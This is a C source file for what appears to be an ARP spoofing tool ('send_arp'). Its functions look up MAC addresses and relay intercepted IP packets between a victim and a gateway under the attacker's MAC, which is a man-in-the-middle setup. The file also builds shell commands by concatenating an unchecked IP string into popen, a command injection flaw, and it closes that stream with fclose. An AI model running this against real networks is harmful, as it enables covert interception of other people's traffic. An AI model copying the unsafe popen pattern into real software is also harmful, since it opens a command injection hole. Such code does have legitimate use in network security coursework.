#include "arp_spoofing.h"

void usage()
{
    printf("./send_arp <interface> <sender ip> <target ip> <sender ip> <target ip> ...\n");
    printf("sample: ./send_arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void Print(const uint8_t* packet, size_t size)
{
    for(uint32_t i = 0; i < size; i++)
    {
        printf("%.2X ", packet[i]);
        if(i % 16 == 15)
        {
            printf("\n");
        }
    }
    printf("\n\n");
}

void get_svr_mac_address(uint8_t* dst)
{
    FILE* fp = popen("/sbin/ifconfig | grep 'ether' | tr -s ' ' | cut -d ' ' -f3", "r");
    char hostMAC_str[20] = {0, };

    if( fgets(hostMAC_str, 20, fp) )
    {
        for(int i = 0; i < MAC_SIZE; i++)
        {
            hostMAC_str[3*i] += (hostMAC_str[3*i] >= 'a' && hostMAC_str[3*i] <= 'f' ? 'A'-'a' : 0);
            hostMAC_str[3*i+1] += (hostMAC_str[3*i+1] >= 'a' && hostMAC_str[3*i+1] <= 'f' ? 'A'-'a' : 0);

            dst[i] += hostMAC_str[3*i] >= 'A' ? hostMAC_str[3*i] - 'A' + 10 : hostMAC_str[3*i] - '0';
            dst[i] *= 16;
            dst[i] += hostMAC_str[3*i+1] >= 'A' ? hostMAC_str[3*i+1] - 'A' + 10 : hostMAC_str[3*i+1] - '0';
        }
    }
    else
    {
        printf("MAC assignming error!\n");
    }

    pclose(fp);
}

void get_svr_ip_address(uint32_t* dst)
{
    FILE* fp = popen("hostname -I", "r");
    char hostIP_str[20] = {0, };

    if( fgets(hostIP_str, 20, fp) )
    {
        *dst = inet_addr(hostIP_str);
    }
    else
    {
        printf("IP assigning error!\n");
    }

    pclose(fp);
}

int is_broadcasting_packet(const uint8_t* packet)
{
    struct libnet_ethernet_hdr* e = (struct libnet_ethernet_hdr*)&packet[0];
    if( !(ntohs(e->ether_type) == ETHERTYPE_ARP) ) return 0;

    uint8_t broadcasting_mac[MAC_SIZE] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if( memcmp(e->ether_dhost, broadcasting_mac, MAC_SIZE) ) return 0;

    return 1;
}

int is_ip_packet(const uint8_t* packet)
{
    struct libnet_ethernet_hdr* e = (struct libnet_ethernet_hdr*)&packet[0];
    return ntohs(e->ether_type) == ETHERTYPE_IP;
}

void get_target_mac_from_arp_table(uint8_t* dst, const uint8_t* packet, addr_pair* address_table, int table_size)
{
    struct libnet_ethernet_hdr* e = (struct libnet_ethernet_hdr*)&packet[0];

    for(int i = 0; i < table_size; i++)
    {
        if( !memcmp(e->ether_shost, address_table[i].sdr_mac, MAC_SIZE) )
        {
            memcpy(dst, address_table[i].tgt_mac, MAC_SIZE);
            return;
        }
    }

    memset(dst, 0, MAC_SIZE);
}

void set_relay_packet(const uint8_t* packet, uint8_t* target_mac, uint8_t* my_mac)
{
    struct libnet_ethernet_hdr* e = (struct libnet_ethernet_hdr*)&packet[0];

    memcpy(e->ether_dhost, target_mac, MAC_SIZE);
    memcpy(e->ether_shost, my_mac, MAC_SIZE);
}

int get_session_location(uint8_t* target_mac, addr_pair* address_table, int session_size)
{
    int i = 0;
    while( i < session_size && memcmp(target_mac, address_table[i].tgt_mac, MAC_SIZE) )
        i++;       // loop it until we found target mac in address table

    return i < session_size ? i : 0;
}

void get_mac_from_ip(uint8_t* dst_mac, const char* ip)
{
    {
        FILE* fp;
        char command[100] = {0, };

        // ping 1 times
        strcat(command, "ping ");
        strcat(command, ip);
        strcat(command, " -c 1");

        fp = popen(command, "r");
        pclose(fp);
    }
    {
        FILE* fp;
        char command[100] = {0, };
        char tmp_mac[20] = {0, };

        strcat(command, "arp -n | grep ^");
        strcat(command, ip);
        strcat(command, "[^0-9] | awk '{print $3}'");   // 10.1.1.1 vs 10.1.1.101 ??

        fp = popen(command, "r");

        if( !fgets(tmp_mac, 20, fp) )
        {
            printf("getting sender mac address error");
            return;
        }

        for( int i = 0; i < MAC_SIZE; i++ )
        {
            // to upper
            tmp_mac[3*i  ] += tmp_mac[3*i  ] >= 'a' && tmp_mac[3*i  ] <= 'f' ? 'A'-'a' : 0;
            tmp_mac[3*i+1] += tmp_mac[3*i+1] >= 'a' && tmp_mac[3*i+1] <= 'f' ? 'A'-'a' : 0;

            // setting
            dst_mac[i] += tmp_mac[3*i  ] >= 'A' ? tmp_mac[3*i  ] - 'A' + 10 : tmp_mac[3*i  ] - '0';
            dst_mac[i] *= 16;
            dst_mac[i] += tmp_mac[3*i+1] >= 'A' ? tmp_mac[3*i+1] - 'A' + 10 : tmp_mac[3*i+1] - '0';
        }

        fclose(fp);
    }
}

void send_relay_packet(pcap_t* handle, const uint8_t* packet, addr_pair* address_table, int session_size, uint32_t packet_size)
{
    uint8_t target_mac[MAC_SIZE] = {0, };   get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
    uint8_t my_mac[MAC_SIZE] = {0, };       get_svr_mac_address(my_mac);
    uint8_t empty_mac[MAC_SIZE] = {0, };

    if( !memcmp(target_mac, empty_mac, MAC_SIZE) ) return;  // return if that target mac was not in arp table

    set_relay_packet(packet, target_mac, my_mac);
    if( pcap_sendpacket(handle, packet, packet_size) )
    {
        printf("relay packet sending failed\n");
        return;
    }

    printf("IP packet(%dsize) relayed\n", packet_size);
}
